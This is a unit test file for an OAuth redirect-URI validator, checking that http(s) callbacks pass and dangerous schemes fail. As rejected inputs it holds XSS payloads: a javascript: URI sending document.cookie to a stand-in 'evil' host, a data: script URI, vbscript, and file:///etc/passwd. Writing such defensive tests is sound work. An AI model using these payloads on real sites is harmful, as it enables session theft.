import { describe, it, expect } from 'vitest';
import { isHttpRedirectUri } from '../oauthRedirect';

describe('isHttpRedirectUri', () => {
  it('accepts http(s) redirect targets (legit OAuth clients)', () => {
    expect(isHttpRedirectUri('https://client.example.com/callback')).toBe(true);
    expect(isHttpRedirectUri('http://localhost:3000/callback')).toBe(true);
    expect(isHttpRedirectUri('http://127.0.0.1:52111/callback')).toBe(true);
    expect(isHttpRedirectUri('https://claude.ai/api/mcp/auth_callback?code=abc')).toBe(true);
  });

  it('rejects javascript: targets (the XSS payload)', () => {
    expect(isHttpRedirectUri("javascript:fetch('//evil/'+document.cookie)")).toBe(false);
    expect(isHttpRedirectUri('javascript:alert(document.cookie)?code=abc')).toBe(false);
  });

  it('rejects other dangerous / non-http schemes', () => {
    expect(isHttpRedirectUri('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isHttpRedirectUri('vbscript:msgbox(1)')).toBe(false);
    expect(isHttpRedirectUri('file:///etc/passwd')).toBe(false);
    expect(isHttpRedirectUri('ftp://example.com/x')).toBe(false);
  });

  it('rejects relative paths and non-absolute / unparseable strings', () => {
    expect(isHttpRedirectUri('/relative/path')).toBe(false);
    expect(isHttpRedirectUri('not a url')).toBe(false);
    expect(isHttpRedirectUri('')).toBe(false);
  });

  it('rejects non-string inputs', () => {
    expect(isHttpRedirectUri(null)).toBe(false);
    expect(isHttpRedirectUri(undefined)).toBe(false);
    expect(isHttpRedirectUri(123)).toBe(false);
    expect(isHttpRedirectUri({})).toBe(false);
  });
});
